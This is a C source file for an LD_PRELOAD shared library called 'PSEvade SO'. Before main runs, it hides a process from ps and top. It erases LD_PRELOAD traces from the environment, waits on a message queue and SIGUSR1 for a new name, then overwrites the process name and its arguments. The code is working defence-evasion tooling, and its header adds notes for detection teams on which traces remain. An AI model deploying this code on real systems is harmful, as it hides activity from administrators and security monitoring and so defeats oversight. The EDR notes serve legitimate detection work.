// #define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <signal.h> 
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>
#include <sys/ipc.h> 
#include <sys/msg.h> 
#include <errno.h>
#include <unistd.h>
#include <time.h>

//#include <dlfcn.h>


// ------------------------------------------------------------------------- //
/*

# PSEvade SO
Side loading of pre-main functionality to hijack signals 
and rename process we have control over in PS table. 
This is done to evade detection by tools relying solely on the PS table info.
This is not a userland rootkit. 


# EDR guidance:

changes values in:
	/proc/pid/cmdline
	/proc/pid/comm

	Affects PS table utilities:
	(e.g. top, ps)

   Resets LD_PRELOAD in /proc/pid/environ 

intact values in:
	leaves preloaded .so in memory maps
		/proc/pid/maps

	Does not affect others:
	(e.g. lsof -p pid ) 

*/


// ------------------------------------------------------------------------- //
/* 
	We have to grab and save argv/argc pointers globally
	so they are visible for update
	Provision for shim commands
*/

char ** largv = NULL;
int     largc;
char ** lenvp = NULL;
char ** commands = NULL;
int     cargc;
char ** noncommands = NULL;

#define MAX_MESG 128

// structure and indetifiers for message queue 
struct mesg_buffer {
	 long mesg_type;
	 char mesg_text[MAX_MESG];
} message;

int msgid;
key_t key;


void setRandezvous(void){

	srand(time(NULL)); 
   // ftok to generate unique key 
   key = ftok(".", rand());

   // msgget wants a message queue with info, 
   // create if not present,
   // return identifier 
   msgid = msgget(key, 0666 | IPC_CREAT);
   if (msgid < 0){
		fprintf(stderr, "%d: %s\n", errno, strerror(errno));
   }else{
   	printf("pid:%d, key:0x%x, msqid:%d\n", getpid(), key, msgid);
	}
}


void SetProcessName(void){

    // msgrcv to receive message 
   msgrcv(msgid, &message, sizeof(message), 1, IPC_NOWAIT);

   char* procname = message.mesg_text;

   // to destroy the message queue  (allow one rename)
   msgctl(msgid, IPC_RMID, NULL); 
   printf("message q destroyed: %d\n", msgid); 


   /* 
		Step 1: Set the name of the calling thread via prctl()
	 		visible in /proc/self/task/[tid]/comm, where tid is the name of the calling thread.
	*/

#ifdef PSDEBUG
	 printf("Setting procname: %s\n", procname);
#endif 
    if (prctl(PR_SET_NAME, (unsigned long) procname, 0, 0, 0) != 0) {
#ifdef PSDEBUG
        fprintf(stderr, "Got error '%s' when setting process name with prctl() to '%s'\n", strerror(errno), procname);
#endif 
		;
    }


    /* 
		 Step 2: Hijack argv[0] (and nullify the rest of args)
	  		WARNING : By that time hopefully the callee process has consumed the arguments
	 */
	
	
    size_t argv0_len = strlen(largv[0]);
    size_t procname_len = strlen(procname);
    size_t max_procname_len = (argv0_len > procname_len) ? (procname_len) : (argv0_len);

    // Copy the maximum size of a name
    strncpy(largv[0], procname, max_procname_len);
    // Clear out the rest (yes, this is needed, or the remaining part of the old
    // process name will still show up in ps)
    memset(&largv[0][max_procname_len], '\0', argv0_len - max_procname_len);

    // Clear the other passed arguments, optional
    // Needs to know argv and argc as passed to main()
    for (size_t i = 1; i < largc; i++) {
     memset(largv[i], '\0', strlen(largv[i]));
    }
}

// Signal handler
static void sig_handler(int sig) 
{ 

#ifdef PSDEBUG
	 printf("Caught signal %d\n", sig); 

    for (int i=0; i<largc; i++) {
        printf("%s: largv[%d] = '%s'\n", __FUNCTION__, i, largv[i]);
    }
#endif

	 // Rename process
	 SetProcessName();
}

void cleanEnv(void){

	 // a. remove from /proc/pid/environ
	 while (*lenvp) {
#ifdef PSDEBUG
		//printf("%s\n", *lenvp);
#endif
      if (strncmp(*lenvp, "LD_PRELOAD=", 11) == 0)
        memset(*lenvp, 0, strlen(*lenvp));
      if (strncmp(*lenvp, "LD_CMD=", 7) == 0)
        memset(*lenvp, 0, strlen(*lenvp));

      lenvp++;
    }

	 // b. remove from process memory if present to be sure
	 unsetenv("LD_PRELOAD"); 
}




// Used to accept argv arguments that may be interpreted as commands.
int OLDcheckCommands(void){

	int  c = 0;
	int  n = 0;
	
	if (1 < largc) {
    for (int i=0; i<largc; i++) {

#ifdef PSDEBUG
		 printf("analysing arg: %s\n", largv[i]);
#endif
	    int last_pos = strlen(largv[i])-1;
	    int command_len = strlen(largv[i]);

			//&& 0 <= last_pos
		 printf("\targ last pos: %d\n", last_pos);
		 printf("\targ value first pos: %c\n", largv[i][0]);


		 // Record only commands
       if ( strncmp(largv[i], "@", 1) == 0 ){
		 	printf("\targ '@' present in compare as first char: %c\n", largv[i][0]);
		 	printf("\targ '@' present in compare as last char: %c\n", largv[i][last_pos]);
		 	commands = (char **)realloc(commands, (sizeof(char*) * (c+1)) );
		 	if( NULL == commands) {
            fprintf(stderr, "Error: Failed to allocate enough memory!\n");
       	}else{


		 		printf("command_len: %d\n", command_len);
				if (command_len >= 2) { 

					//remove '@'s,
					memmove(largv[i], largv[i]+1, command_len -2 );
					largv[i][command_len - 2] = '\0';
		 			commands[c] = strdup(largv[i]);
				}	
				/* 
					Optional: NOP out commands from argv. 
				   WARNING: callee sill receives empty placeholders for argvs we deleted. 

					TODO: I was not able to replace argv with noncommands due to realloc() 
							not guaranteeing in place buffer reallocation
				*/

     			memset(largv[i], 0, strlen(largv[i]));
		 		++c;
		 	}

		 // Record only non-commands: real argv
		 }else{
		 	noncommands = (char **)realloc(noncommands, (sizeof(char*) * (n+1)) );
		 	if( NULL == noncommands) {
            fprintf(stderr, "Error: Failed to allocate enough memory!\n");
       	}else{
		 		noncommands[n] = strdup(largv[i]);
		 		++n;
		   }
			
		 }
     }
	}

#ifdef PSDEBUG
	if (n > 0){
   	printf("Non-Command args: \n");
		for( int i = 0; i < n; ++i) {
			  printf("\t%d) \"%s\"\n", i, noncommands[i]);
		}
	}

	if (c > 0){
   	printf("Command args: \n");
		for( int i = 0; i < c; ++i) {
			  printf("\t%d) \"%s\"\n", i, commands[i]);
		}
	}
#endif

	cargc=c;
	return cargc;
}

int processCommands(void){

	char *cmds = NULL;
	char *cmd, *key, *val;

	if ( (cmds = (char*) getenv("LD_CMD")) == NULL ){
		printf("Invalid LD_CMD");
	   return 0;

	}else{
		printf("LD_CMDi: %s\n", cmds);

		cmd = strdup(cmds); 
		key = strtok(cmd, ":");
		val = strtok(NULL, ":");
		printf("%s => %s\n", key, val);

		if ( strcmp(key, "r") == 0 ){
				printf("imediate rename to static(%s)\n", val);
		} else if ( strcmp(key, "R") == 0 ){
				printf("delayed rename to static(%s)\n", val);
		} else if ( strcmp(key, "M") == 0 ){
				printf("delayed rename to dynamic (method: %s)\n", val);
		} else {
				printf("unsupported: %s\n", key);
		}
	}

	return 1;
}

// Constructor called by ld.so before the main. This is not guaranteed but works.
__attribute__((constructor)) static void myctor(int argc, char **argv, char** envp)
{

	 // Save pointers to argv/argc/envp
	 largv=argv;
	 largc=argc;
	 lenvp=envp;

#ifdef PSDEBUG
	 printf("pointer argv: %p\n", argv);
	 printf("pointer largv: %p\n", largv);
    for (int i=0; i<argc; i++) {
        printf("%s: argv[%d] = '%s'\n", __FUNCTION__, i, argv[i]);
    }
#endif

	 if (processCommands() > 0){

		 // evade: establish control channel
		 setRandezvous();

		 // evade: wait for external command
		 signal(SIGUSR1, sig_handler); 
	 }

	 // always evade: clean LD_PRELOAD pointers
	 cleanEnv();

}

// Destructor if needed.
__attribute__((destructor)) static void mydtor(void) { }
